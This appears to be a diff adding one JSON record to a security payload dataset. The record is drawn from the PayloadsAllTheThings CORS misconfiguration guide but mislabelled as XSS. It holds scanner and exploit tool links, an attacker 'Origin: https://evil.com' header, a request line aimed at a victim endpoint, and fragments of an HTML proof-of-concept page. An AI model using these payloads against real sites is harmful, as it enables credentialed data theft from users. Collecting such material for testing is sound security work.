@@ -1,0 +1,27 @@
+{
+  "id": "xss-3228d0846e5d",
+  "category": "XSS",
+  "title": "README",
+  "description": "# CORS Misconfiguration\n\n> A site-wide CORS misconfiguration was in place for an API domain. This allowed an attacker to make cross origin requests on behalf of the user as the application did not whitelist the Origin header and had Access-Control-Allow-Credentials: true meaning we could make requests from our attacker\u2019s site using the victim\u2019s credentials.\n\n## Summary\n\n* [Tools](#tools)\n* [Requirements](#requirements)\n* [Methodology](#methodology)\n    * [Origin Reflection](#origin-reflection)\n ",
+  "payloads": [
+    "* [s0md3v/Corsy](https://github.com/s0md3v/Corsy/) - CORS Misconfiguration Scanner",
+    "* [chenjj/CORScanner](https://github.com/chenjj/CORScanner) - Fast CORS misconfiguration vulnerabilities scanner",
+    "* [@honoki/PostMessage](https://tools.honoki.net/postmessage.html) - POC Builder",
+    "* [trufflesecurity/of-cors](https://github.com/trufflesecurity/of-cors) - Exploit CORS misconfigurations on the internal networks",
+    "* [omranisecurity/CorsOne](https://github.com/omranisecurity/CorsOne) - Fast CORS Misconfiguration Discovery Tool",
+    "* BURP HEADER> `Origin: https://evil.com`",
+    "* VICTIM HEADER> `Access-Control-Allow-Origin: https://evil.com` OR `Access-Control-Allow-Origin: null`",
+    "Usually you want to target an API endpoint. Use the following payload to exploit a CORS misconfiguration on target `https://victim.example.com/endpoint`.",
+    "Origin: https://evil.com",
+    "Access-Control-Allow-Origin: https://evil.com",
+    "req.open('get','https://victim.example.com/endpoint',true);",
+    "<html>",
+    "<body>",
+    "<h2>CORS PoC</h2>",
+    "<div id=\"demo\">"
+  ],
+  "references": [
+    "PayloadsAllTheThings/CORS Misconfiguration/README.md"
+  ],
+  "source": "PayloadsAllTheThings"
+}
